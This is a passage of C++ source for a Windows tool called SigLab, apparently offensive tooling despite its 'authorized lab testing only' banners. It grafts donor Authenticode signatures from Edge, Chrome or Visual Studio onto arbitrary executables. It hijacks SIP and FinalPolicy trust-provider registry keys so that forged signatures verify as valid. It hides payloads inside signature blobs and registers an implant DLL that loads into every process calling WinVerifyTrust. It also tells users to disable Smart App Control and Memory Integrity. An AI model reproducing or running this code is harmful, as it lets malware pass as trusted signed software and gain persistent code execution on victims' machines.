    if (autoMode && !ui::Minimal()) {
        std::cout << '\n';
        ProbeFlow();

        const pesign::CiState ci = pesign::ProbeCodeIntegrity();
        if (ci.ok) {
            if (ci.flags & 0x2000) {
                ui::Warn("Smart App Control is ON - it can keep signatures invalid.");
                ui::Print(ui::Tone::Dim,
                          "      Windows Security -> App & browser control -> Smart App Control -> Off.\n");
            }
            if (ci.flags & 0x100) {
                ui::Warn("Memory Integrity (HVCI) is ON - it can block the SIP bypass.");
                ui::Print(ui::Tone::Dim,
                          "      Windows Security -> Device security -> Core isolation -> Memory integrity -> Off, then reboot.\n");
            }
        }
    }

    if (elevated || autoMode) {
        ui::Info("Verifying in a fresh process...");
        freshStatus = static_cast<int>(VerifyInNewProcess(work));
    }

    if (!ui::Minimal()) {
        PrintSignResult(work, inPlace, freshStatus, bypassState);
    }

    if (exitCode) {
        *exitCode = (freshStatus == 0) ? 0 : (freshStatus == 2 ? 2 : 3);
    }

    if (autoMode && !ui::Minimal()) {
        std::cout << '\n';
        if (freshStatus == 0) {
            ui::Ok("DONE - the file now verifies as VALID.");
            ui::Print(ui::Tone::Dim,
                      "      Explorer's Digital Signatures tab reuses its cached check. Log off / sign in\n");
            ui::Print(ui::Tone::Dim,
                      "      (or restart Explorer) before checking the file's Properties page.\n");
        } else if (freshStatus == 2) {
            ui::Warn("DONE - the signature was grafted, but verification is still HashMismatch.");
            if (!elevated) {
                ui::Print(ui::Tone::Dim,
                          "      The bypass was not installed because the tool is not elevated.\n");
            } else {
                ui::Print(ui::Tone::Dim,
                          "      The bypass is installed but did not take effect. Reboot / log off,\n");
                ui::Print(ui::Tone::Dim,
                          "      and check HVCI / Smart App Control in the probe output above.\n");
            }
        } else {
            ui::Warn("DONE - the signature was grafted, but fresh verification did not pass.");
        }
        ui::Print(ui::Tone::Dim,
                  "      Undo the registry bypass later with: SigLab.exe --clean\n");
    }
}

// ---------------------------------------------------------------------------
// Registry bypass / clean
// ---------------------------------------------------------------------------

std::vector<SipEntry> AllSipTypes() {
    std::vector<SipEntry> sips;
    for (int i = 0; i < NUM_STANDARD_SIPS; ++i) {
        sips.push_back(ALL_STANDARD_SIPS[i]);
    }
    sips.push_back(SAC_SIP);
    sips.push_back(WIN11_SIP);
    return sips;
}

void BypassFlow() {
    ui::Rule("BYPASS / REGISTRY");

    if (!IsRunningAsAdmin()) {
        ui::Error("This operation requires Administrator privileges.");
        ui::Info("Restart SigLab with 'Run as administrator'.");
        return;
    }

    std::cout << "\n  [1] SIP bypass - default (PE, PowerShell, MSI)\n";
    std::cout << "  [2] SIP bypass - all 17 standard types\n";
    std::cout << "  [3] SIP bypass - all 19 (includes SAC + AppX extensions)\n";
    std::cout << "  [4] SIP bypass - custom type list\n";
    std::cout << "  [5] FinalPolicy bypass (SoftpubCleanup)\n";
    std::cout << "  [6] Custom trust provider\n";
    std::cout << "  [0] Back\n";

    const int choice = PromptChoice("  select [0]: ", 0, 6, 0);
    if (choice == 0) return;

    if (choice >= 1 && choice <= 4) {
        std::vector<SipEntry> sips;
        if (choice == 1) {
            sips = resolve_sip_types("", false, false);
        } else if (choice == 2) {
            sips = resolve_sip_types("all", false, false);
        } else if (choice == 3) {
            sips = resolve_sip_types("", false, true);
        } else {
            std::string types;
            if (!ReadInput("  SIP types (e.g. PE,PowerShell,MSI): ", types) || types.empty()) {
                ui::Error("No SIP types selected.");
                return;
            }
            sips = resolve_sip_types(types, false, false);
        }

        if (sips.empty()) {
            ui::Error("No SIP types selected.");
            return;
        }

        std::cout << "\n  Target SIP types: ";
        for (size_t i = 0; i < sips.size(); ++i) {
            if (i) std::cout << ", ";
            std::cout << ui::WToU8(sips[i].name);
        }
        std::cout << '\n';

        if (!Confirm("  Apply SIP bypass? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }

        if (install_sip_bypass(sips, false)) {
            ui::Ok("SIP bypass installed.");
        } else {
            ui::Error("SIP bypass incomplete. Check the errors above.");
        }
        ui::Info("Start a new process (or log out / log in) for the change to take effect.");
        return;
    }

    if (choice == 5) {
        if (!Confirm("  Redirect FinalPolicy to SoftpubCleanup? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        if (bypass_finalpolicy()) {
            ui::Ok("FinalPolicy bypass installed.");
        } else {
            ui::Error("FinalPolicy bypass failed.");
        }
        ui::Info("System-wide. Start a new process (or log out / log in).");
        return;
    }

    if (choice == 6) {
        std::wstring guid;
        if (!PromptPath("  Custom provider GUID: ", guid)) return;
        if (!Confirm("  Register this custom provider? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        if (bypass_custom_provider(guid)) {
            ui::Ok("Custom provider registered: " + ui::WToU8(normalize_provider_guid(guid)));
        } else {
            ui::Error("Custom provider registration failed.");
        }
    }
}

void CleanFlow() {
    ui::Rule("CLEAN / RESTORE");

    if (!IsRunningAsAdmin()) {
        ui::Error("This operation requires Administrator privileges.");
        ui::Info("Restart SigLab with 'Run as administrator'.");
        return;
    }

    std::cout << "\n  [1] Restore all SIP keys (19)\n";
    std::cout << "  [2] Restore FinalPolicy\n";
    std::cout << "  [3] Remove a custom trust provider\n";
    std::cout << "  [4] Restore everything (SIP + FinalPolicy)\n";
    std::cout << "  [0] Back\n";

    const int choice = PromptChoice("  select [0]: ", 0, 4, 0);
    if (choice == 0) return;

    if (choice == 4) {
        if (!Confirm("  Restore all SIP keys and FinalPolicy? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        const std::vector<SipEntry> sips = AllSipTypes();
        const bool sipOk = cleanup_registry(sips);
        const bool legacyOk = cleanup_legacy_sip_keys(sips);
        const bool policyOk = cleanup_finalpolicy();
        if (sipOk) ui::Ok("SIP keys restored.");
        else ui::Warn("Some SIP keys could not be restored.");
        if (legacyOk) ui::Ok("Legacy SIP keys removed.");
        else ui::Warn("Some legacy SIP keys could not be removed.");
        if (policyOk) ui::Ok("FinalPolicy restored.");
        else ui::Warn("FinalPolicy restore failed.");
        ui::Info("Start a new process (or log out / log in).");
        return;
    }

    if (choice == 1) {
        if (!Confirm("  Restore all 19 SIP keys? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        const std::vector<SipEntry> sips = AllSipTypes();
        if (cleanup_registry(sips)) ui::Ok("SIP keys restored.");
        else ui::Warn("Some SIP keys could not be restored.");
        if (cleanup_legacy_sip_keys(sips)) ui::Ok("Legacy SIP keys removed.");
        else ui::Warn("Some legacy SIP keys could not be removed.");
        ui::Info("Start a new process (or log out / log in).");
        return;
    }

    if (choice == 2) {
        if (!Confirm("  Restore FinalPolicy to SoftpubAuthenticode? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        if (cleanup_finalpolicy()) ui::Ok("FinalPolicy restored.");
        else ui::Error("FinalPolicy restore failed.");
        ui::Info("Start a new process (or log out / log in).");
        return;
    }

    if (choice == 3) {
        std::wstring guid;
        if (!PromptPath("  Custom provider GUID: ", guid)) return;
        if (!Confirm("  Remove this custom provider key? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }
        if (cleanup_custom_provider(guid)) {
            ui::Ok("Custom provider removed: " + ui::WToU8(normalize_provider_guid(guid)));
        } else {
            ui::Error("Custom provider removal failed.");
        }
    }
}

int CleanAllCommand() {
    if (!IsRunningAsAdmin()) {
        ui::Error("Clean requires Administrator privileges.");
        ui::Info("Restart SigLab with 'Run as administrator'.");
        return 1;
    }

    const std::vector<SipEntry> sips = AllSipTypes();

    ui::Info("Restoring all 19 SIP keys...");
    const bool sipOk = cleanup_registry(sips);
    const bool legacyOk = cleanup_legacy_sip_keys(sips);

    ui::Info("Restoring FinalPolicy...");
    const bool policyOk = cleanup_finalpolicy();

    if (sipOk) ui::Ok("SIP keys restored.");
    else ui::Warn("Some SIP keys could not be restored.");
    if (legacyOk) ui::Ok("Legacy SIP keys removed.");
    else ui::Warn("Some legacy SIP keys could not be removed.");
    if (policyOk) ui::Ok("FinalPolicy restored.");
    else ui::Warn("FinalPolicy restore failed.");

    ui::Info("Start a new process (or log out / log in).");
    return (sipOk && policyOk) ? 0 : 1;
}

// ---------------------------------------------------------------------------
// Embed / extract
// ---------------------------------------------------------------------------

void EmbedFlow() {
    ui::Rule("EMBED PAYLOAD IN SIGNATURE");
    ui::Info("The input PE must already have an embedded Authenticode signature.");

    std::wstring pe;
    if (!PromptExistingFile("  Signed PE file: ", pe)) return;

    const pesign::PeInfo info = pesign::InspectPe(pe);
    if (!info.valid || !pesign::HasSignature(info)) {
        ui::Error("That PE has no embedded signature. Graft one first.");
        return;
    }

    std::wstring payload;
    if (!PromptExistingFile("  Payload file: ", payload)) return;

    const std::wstring defaultOutput = UniqueSiblingPath(pe, L"_stashed");
    const std::wstring output = PromptOptionalPath(
        "  Output PE [" + ui::WToU8(defaultOutput) + "]: ", defaultOutput);

    std::cout << "\n  [1] Direct (custom OID)\n";
    std::cout << "  [2] Camouflage (SPC_NESTED_SIGNATURE)\n";
    const int mode = PromptChoice("  select [1]: ", 1, 2, 1);

    std::string oid = "1.3.6.1.4.1.311.99.1";
    if (mode == 1) {
        std::string input;
        if (ReadInput("  OID [" + oid + "]: ", input) && !input.empty()) {
            oid = input;
        }
    }

    if (!Confirm("  Write " + ui::WToU8(output) + "? [Y/n]: ", true)) {
        ui::Info("Cancelled.");
        return;
    }

    if (pkcs7::embed(ui::WToU8(pe), ui::WToU8(payload), ui::WToU8(output),
                     oid, mode == 2, false)) {
        ui::Ok("Payload embedded.");
        ui::Print(ui::Tone::Dim, "  Output : ");
        std::cout << ui::WToU8(output) << '\n';
    } else {
        ui::Error("Embed failed.");
    }
}

void ExtractFlow() {
    ui::Rule("EXTRACT PAYLOAD FROM SIGNATURE");

    std::wstring pe;
    if (!PromptExistingFile("  Signed PE file: ", pe)) return;

    const pesign::PeInfo info = pesign::InspectPe(pe);
    if (!info.valid || !pesign::HasSignature(info)) {
        ui::Error("That PE has no embedded signature.");
        return;
    }

    const std::wstring defaultOutput = UniqueSiblingPath(pe, L"_payload", L".bin");
    const std::wstring output = PromptOptionalPath(
        "  Output payload [" + ui::WToU8(defaultOutput) + "]: ", defaultOutput);

    std::cout << "\n  [1] Direct\n";
    std::cout << "  [2] Camouflage (SPC_NESTED_SIGNATURE)\n";
    const int mode = PromptChoice("  select [1]: ", 1, 2, 1);

    std::string oid = "1.3.6.1.4.1.311.99.1";
    if (mode == 1) {
        std::string input;
        if (ReadInput("  OID [" + oid + "]: ", input) && !input.empty()) {
            oid = input;
        }
    }

    if (pkcs7::extract(ui::WToU8(pe), ui::WToU8(output), oid, mode == 2, false)) {
        ui::Ok("Payload extracted.");
        std::error_code ec;
        const uint64_t size = fs::file_size(output, ec);
        if (!ec) {
            ui::Print(ui::Tone::Dim, "  Output : ");
            std::cout << ui::WToU8(output) << " (" << size << " bytes)\n";
        }
    } else {
        ui::Error("Extract failed.");
    }
}

// ---------------------------------------------------------------------------
// SIP-Exec implant
// ---------------------------------------------------------------------------

struct GuidAlias {
    const char* alias;
    const wchar_t* guid;
    const char* extensions;
};

const GuidAlias GUID_ALIASES[] = {
    {"authenticode", L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"},
    {"pe",           L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"},
    {"java",         L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", ".class"},
    {"cab",          L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", ".cab"},
    {"msi",          L"{000C10F1-0000-0000-C000-000000000046}", ".msi .msp"},
    {"ps1",          L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1 .cdxml .mof"},
    {"powershell",   L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1 .cdxml .mof"},
    {"jscript",      L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", ".js .jse"},
    {"vbscript",     L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", ".vbs .vbe"},
    {"wsf",          L"{1A610570-38CE-11D4-A2A3-00104BD35090}", ".wsf .wsc .sct"},
    {"appx",         L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", ".appx .msix"},
    {"appx-bundle",  L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", ".appxbundle .msixbundle"},
    {"ctl",          L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", ".ctl .stl"},
    {"catalog",      L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", ".cat"},
    {"esd",          L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}", ".esd .wim"},
    {"sac",          L"{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}", "(Smart App Control, Win11)"},
    {nullptr, nullptr, nullptr},
};

const wchar_t* ResolveGuid(const char* input, const char** extensions) {
    for (int i = 0; GUID_ALIASES[i].alias; ++i) {
        if (_stricmp(input, GUID_ALIASES[i].alias) == 0) {
            if (extensions) *extensions = GUID_ALIASES[i].extensions;
            return GUID_ALIASES[i].guid;
        }
    }
    if (extensions) *extensions = "(custom GUID)";
    return nullptr;
}

std::wstring NormalizeGuid(const std::string& input) {
    const wchar_t* resolved = ResolveGuid(input.c_str(), nullptr);
    std::wstring guid = resolved ? resolved : ui::U8ToW(input);
    if (guid.empty()) return {};
    if (guid.front() != L'{') guid.insert(guid.begin(), L'{');
    if (guid.back() != L'}') guid.push_back(L'}');
    return guid;
}

void SipExecList() {
    HKEY key = nullptr;
    const std::wstring base =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2";

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0,
                      KEY_READ | KEY_WOW64_64KEY, &key) != ERROR_SUCCESS) {
        ui::Info("No SIP-Exec registrations found.");
        return;
    }

    std::printf("  Registered SIP triggers:\n");

    DWORD index = 0;
    while (true) {
        wchar_t name[256] = {};
        DWORD nameLength = static_cast<DWORD>(std::size(name));
        if (RegEnumKeyExW(key, index++, name, &nameLength,
                          nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) {
            break;
        }

        const std::wstring subpath = base + L"\\" + name;
        HKEY sub = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subpath.c_str(), 0,
                          KEY_READ | KEY_WOW64_64KEY, &sub) == ERROR_SUCCESS) {
            wchar_t dll[512] = {};
            wchar_t function[256] = {};
            DWORD dllSize = sizeof(dll);
            DWORD functionSize = sizeof(function);
            RegQueryValueExW(sub, L"Dll", nullptr, nullptr,
                             reinterpret_cast<BYTE*>(dll), &dllSize);
            RegQueryValueExW(sub, L"FuncName", nullptr, nullptr,
                             reinterpret_cast<BYTE*>(function), &functionSize);
            std::printf("  %s\n", ui::WToU8(name).c_str());
            std::printf("      DLL      : %s\n", ui::WToU8(dll).c_str());
            std::printf("      Function : %s\n", ui::WToU8(function).c_str());
            RegCloseKey(sub);
        }
    }
    RegCloseKey(key);
}

void SipExecFlow() {
    ui::Rule("SIP-EXEC IMPLANT");

    std::cout << "\n  [1] Install implant DLL\n";
    std::cout << "  [2] Remove implant\n";
    std::cout << "  [3] List registered triggers\n";
    std::cout << "  [0] Back\n";

    const int choice = PromptChoice("  select [0]: ", 0, 3, 0);
    if (choice == 0) return;

    if (choice == 3) {
        SipExecList();
        return;
    }

    if (!IsRunningAsAdmin()) {
        ui::Error("This operation requires Administrator privileges.");
        ui::Info("Restart SigLab with 'Run as administrator'.");
        return;
    }

    if (choice == 1) {
        std::wstring dll;
        if (!PromptExistingFile("  Implant DLL: ", dll)) return;

        std::string alias;
        if (!ReadInput("  SIP alias or GUID [pe]: ", alias) || alias.empty()) {
            alias = "pe";
        }

        const char* extensions = nullptr;
        const wchar_t* resolved = ResolveGuid(alias.c_str(), &extensions);
        std::wstring guid = resolved ? resolved : NormalizeGuid(alias);
        if (guid.empty()) {
            ui::Error("Invalid GUID.");
            return;
        }

        const std::wstring subkey =
            L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\" +
            guid;

        ui::Warn("This registers a DLL that loads inside processes calling WinVerifyTrust.");
        ui::Warn("Authorized VM / lab testing only.");
        if (!Confirm("  Install SIP trigger? [y/N]: ", false)) {
            ui::Info("Cancelled.");
            return;
        }

        if (SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), dll.c_str(),
                              L"IsMyFileType2", KEY_WOW64_64KEY)) {
            ui::Ok("Implant installed on the SIP execution surface.");
            ui::Print(ui::Tone::Dim, "  GUID     : ");
            std::cout << ui::WToU8(guid) << '\n';
            ui::Print(ui::Tone::Dim, "  Triggers : ");
            std::cout << (extensions ? extensions : "(custom GUID)") << '\n';
            ui::Print(ui::Tone::Dim, "  Payload  : ");
            std::cout << ui::WToU8(dll) << '\n';
            ui::Info("New processes that call WinVerifyTrust on matching files will load it.");
        } else {
            ui::Error("Install failed. Run as Administrator.");
        }
        return;
    }

    std::string alias;
    if (!ReadInput("  SIP alias or GUID [pe]: ", alias) || alias.empty()) {
        alias = "pe";
    }

    const std::wstring guid = NormalizeGuid(alias);
    if (guid.empty()) {
        ui::Error("Invalid GUID.");
        return;
    }

    const std::wstring subkey =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\" +
        guid;

    if (!Confirm("  Remove this SIP trigger? [y/N]: ", false)) {
        ui::Info("Cancelled.");
        return;
    }

    const LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
    if (result == ERROR_SUCCESS || result == ERROR_FILE_NOT_FOUND ||
        result == ERROR_PATH_NOT_FOUND) {
        ui::Ok("SIP trigger removed: " + ui::WToU8(guid));
    } else {
        ui::Error("Remove failed (error " + std::to_string(result) +
                  "). Run as Administrator.");
    }
}

// ---------------------------------------------------------------------------
// Probe
// ---------------------------------------------------------------------------

std::wstring ReadHklmString(const std::wstring& subkey, const wchar_t* value,
                            REGSAM view) {
    HKEY key = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0,
                      KEY_READ | view, &key) != ERROR_SUCCESS) {
        return L"(missing)";
    }

    wchar_t buffer[512] = {};
    DWORD size = sizeof(buffer);
    DWORD type = 0;
    const LONG result = RegQueryValueExW(key, value, nullptr, &type,
                                         reinterpret_cast<BYTE*>(buffer), &size);
    RegCloseKey(key);

    if (result != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) {
        return L"(missing)";
    }
    return buffer;
}

void ProbeFlow() {
    ui::Rule("CODE INTEGRITY PROBE");

    const pesign::CiState ci = pesign::ProbeCodeIntegrity();
    if (!ci.ok) {
        ui::Error("Probe failed: " + ui::WToU8(ci.error));
        return;
    }

    const ULONG flags = ci.flags;
    auto flag = [flags](const char* name, ULONG mask) {
        ui::Print(ui::Tone::Dim, "  " + std::string(name) + ": ");
        if (flags & mask) ui::Print(ui::Tone::Yellow, "YES\n");
        else std::cout << "no\n";
    };

    std::printf("  Raw flags: 0x%08lX\n", static_cast<unsigned long>(flags));
    flag("CI Enabled", 0x01);
    flag("Test Signing", 0x02);
    flag("UMCI (User-Mode CI)", 0x04);
    flag("Debug Mode", 0x08);
    flag("Flight Signing", 0x20);
    flag("HVCI (Memory Integrity)", 0x100);
    flag("HVCI Audit Mode", 0x200);
    flag("HVCI Strict Mode", 0x400);
    flag("HVCI IUM", 0x800);
    flag("Smart App Control", 0x2000);

    ui::Print(ui::Tone::Dim, "  Running as admin: ");
    std::cout << (IsRunningAsAdmin() ? "yes\n" : "no\n");

    std::cout << '\n';
    ui::Print(ui::Tone::Cyan, "  Lab bypass state (read-only):\n");

    const std::wstring sipBase =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\"
        L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}";
    const std::wstring finalPolicy =
        L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\"
        L"{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

    auto show = [](const char* label, const std::wstring& dll,
                   const std::wstring& function) {
        ui::Print(ui::Tone::Dim, std::string("  ") + label + ": ");
        if (dll == L"(missing)") {
            std::cout << "(missing)\n";
            return;
        }
        std::cout << ui::WToU8(dll) << "!" << ui::WToU8(function) << '\n';
    };

    show("PE SIP    64-bit",
         ReadHklmString(sipBase, L"Dll", KEY_WOW64_64KEY),
         ReadHklmString(sipBase, L"FuncName", KEY_WOW64_64KEY));
    show("PE SIP    32-bit",
         ReadHklmString(sipBase, L"Dll", KEY_WOW64_32KEY),
         ReadHklmString(sipBase, L"FuncName", KEY_WOW64_32KEY));
    show("FinalPolicy 64-bit",
         ReadHklmString(finalPolicy, L"$DLL", KEY_WOW64_64KEY),
         ReadHklmString(finalPolicy, L"$Function", KEY_WOW64_64KEY));
    show("FinalPolicy 32-bit",
         ReadHklmString(finalPolicy, L"$DLL", KEY_WOW64_32KEY),
         ReadHklmString(finalPolicy, L"$Function", KEY_WOW64_32KEY));
}

// ---------------------------------------------------------------------------
// Menu / entry point
// ---------------------------------------------------------------------------

void PrintMainMenu() {
    ui::Rule("MAIN MENU");
    std::cout << "  [1]  Sign / graft signature\n";
    std::cout << "  [2]  Bypass / registry\n";
    std::cout << "  [3]  Embed payload in signature\n";
    std::cout << "  [4]  Extract payload from signature\n";
    std::cout << "  [5]  SIP-Exec implant\n";
    std::cout << "  [6]  Probe Code Integrity\n";
    std::cout << "  [7]  Clean / restore\n";
    std::cout << "  [0]  Exit\n";
}

void PrintHelp() {
    std::cout << "\n  Usage:\n";
    std::cout << "    SigLab.exe <file>          sign the file and install the bypass\n";
    std::cout << "    SigLab.exe                 ask for the file path, then do the same\n";
    std::cout << "    SigLab.exe --copy <file>   write <name>_signed instead of in place\n";
    std::cout << "    SigLab.exe --clean         restore the registry bypass\n";
    std::cout << "    SigLab.exe --probe         show Code Integrity / HVCI / SAC state\n";
    std::cout << "    SigLab.exe --verify <file> exit 0 = VALID, 2 = HashMismatch, 3 = other\n";
    std::cout << "    SigLab.exe --advanced      full manual toolkit menu\n";
    std::cout << "    SigLab.exe --verbose       show full diagnostics\n";
    std::cout << "    SigLab.exe --no-elevate    never ask for UAC (bypass will be skipped)\n\n";
    std::cout << "  One run does everything:\n";
    std::cout << "    1. inspect the target PE\n";
    std::cout << "    2. pick a signed donor automatically (Edge / Chrome / VS)\n";
    std::cout << "    3. graft the donor Authenticode signature\n";
    std::cout << "    4. install SIP (all 19) + FinalPolicy bypass (Administrator only)\n";
    std::cout << "    5. probe Code Integrity / HVCI / Smart App Control\n";
    std::cout << "    6. verify in a fresh process (VALID / HashMismatch)\n\n";
    std::cout << "  Optional: --donor <signed exe>\n";
    std::cout << "  Registry operations require Administrator. Authorized VM testing only.\n";
}

int main(int argc, char** argv) {
    ui::Init();
    g_verbose = false;

    std::wstring targetArg;
    std::wstring donorArg;
    bool showHelp = false;
    bool showBanner = false;
    bool advanced = false;
    bool copyMode = false;
    bool doClean = false;
    bool doProbe = false;
    bool noElevate = false;
    bool verbose = false;

    for (int i = 1; i < argc; ++i) {
        const std::string argument = argv[i];

        if (argument == "--verify" || argument == "--verify-quiet") {
            if (i + 1 >= argc) {
                ui::Error("Usage: SigLab.exe --verify <file>");
                return 3;
            }
            const bool quiet = (argument == "--verify-quiet");
            const std::wstring path =
                ExpandEnvironment(ui::U8ToW(StripQuotes(argv[i + 1])));
            return VerifyCommand(path, quiet);
        }
        if (argument == "--help" || argument == "-h" || argument == "/?") {
            showHelp = true;
            continue;
        }
        if (argument == "--banner") {
            showBanner = true;
            continue;
        }
        if (argument == "--advanced" || argument == "--menu") {
            advanced = true;
            continue;
        }
        if (argument == "--copy") {
            copyMode = true;
            continue;
        }
        if (argument == "--clean") {
            doClean = true;
            continue;
        }
        if (argument == "--probe") {
            doProbe = true;
            continue;
        }
        if (argument == "--no-elevate") {
            noElevate = true;
            continue;
        }
        if (argument == "--verbose" || argument == "-v") {
            verbose = true;
            continue;
        }
        if (argument == "--donor") {
            if (i + 1 >= argc) {
                ui::Error("Usage: SigLab.exe --donor <signed exe>");
                return 1;
            }
            donorArg = ExpandEnvironment(ui::U8ToW(StripQuotes(argv[++i])));
            continue;
        }
        if (!argument.empty() && (argument[0] == '-' || argument[0] == '/')) {
            ui::Error("Unknown argument: " + argument);
            return 1;
        }
        if (!targetArg.empty()) {
            ui::Error("Only one target file can be signed per run.");
            return 1;
        }
        targetArg = ExpandEnvironment(ui::U8ToW(StripQuotes(argument)));
    }

    const bool oneShot =
        !showHelp && !showBanner && !doClean && !doProbe && !advanced;
    ui::SetMinimal(oneShot && !verbose);
    g_verbose = verbose || advanced;

    if (showHelp) {
        art::PrintBanner();
        PrintHelp();
        return 0;
    }

    if (showBanner) {
        art::PrintBanner();
        return 0;
    }

    // Signing and cleaning need HKLM access. Elevate automatically instead of
    // silently producing a HashMismatch because the user forgot "Run as
    // administrator". --probe is read-only and never prompts.
    const bool needsElevation = doClean || advanced || !doProbe;
    if (needsElevation && !noElevate && !IsRunningAsAdmin()) {
        if (!ui::Minimal()) {
            ui::Print(ui::Tone::Dim,
                      "  Requesting Administrator privileges (UAC)...\n");
        }
        const int elevatedExit = RelaunchElevated();
        if (elevatedExit >= 0) return elevatedExit;
        if (ui::Minimal()) {
            ui::Print(ui::Tone::Red,
                      "  [-] Administrator rights are required.\n");
            PauseIfOwnConsole();
            return 1;
        }
        ui::Warn("Elevation cancelled - continuing without Administrator rights.");
        ui::Print(ui::Tone::Dim,
                  "      The registry bypass will be skipped; verification will show HashMismatch.\n");
    }

    art::PrintBanner();

    if (doClean) {
        const int cleanExit = CleanAllCommand();
        PauseIfOwnConsole();
        return cleanExit;
    }

    if (doProbe) {
        ProbeFlow();
        PauseIfOwnConsole();
        return 0;
    }

    if (!ui::Minimal()) {
        ui::Print(ui::Tone::Yellow,
                  "  [!] Authorized VM / lab testing only.\n");

        if (IsRunningAsAdmin()) {
            ui::Print(ui::Tone::Green,
                      "  [+] Administrator: SIP + FinalPolicy bypass will be installed automatically.\n");
        } else {
            ui::Print(ui::Tone::Yellow,
                      "  [!] Not elevated: signing works, but the auto registry bypass is skipped.\n");
            ui::Print(ui::Tone::Dim,
                      "      Right-click SigLab.exe -> Run as administrator for VALID verification.\n");
        }
    }

    if (advanced) {
        while (!ui::g_eof) {
            PrintMainMenu();
            const int choice = PromptChoice("  select [0]: ", 0, 7, 0);
            if (choice == 0) break;

            switch (choice) {
            case 1: SignFlow(); break;
            case 2: BypassFlow(); break;
            case 3: EmbedFlow(); break;
            case 4: ExtractFlow(); break;
            case 5: SipExecFlow(); break;
            case 6: ProbeFlow(); break;
            case 7: CleanFlow(); break;
            default: break;
            }

            std::cout << '\n';
        }

        std::cout << '\n';
        ui::Print(ui::Tone::Dim, "  SigLab exiting.\n\n");
        PauseIfOwnConsole();
        return 0;
    }

    if (targetArg.empty()) {
        std::cout << '\n';
        if (!ui::Minimal()) {
            ui::Print(ui::Tone::Dim,
                      "  Enter the file to sign (or drag & drop it here), then press Enter.\n");
        }
        if (!PromptExistingFile("  File to sign: ", targetArg)) {
            PauseIfOwnConsole();
            return 1;
        }
    }

    int exitCode = 3;
    SignFlow(targetArg, true, copyMode, &exitCode, donorArg);

    if (ui::Minimal()) {
        if (exitCode == 0) {
            ui::Print(ui::Tone::Green, "  [+] Successful.\n");
        } else if (exitCode == 2) {
            ui::Print(ui::Tone::Red, "  [-] Signature did not verify.\n");
        } else if (!ui::ErrorShown()) {
            ui::Print(ui::Tone::Red, "  [-] Verification failed.\n");
        }
    } else {
        std::cout << '\n';
    }

    PauseIfOwnConsole();
    return exitCode;
}
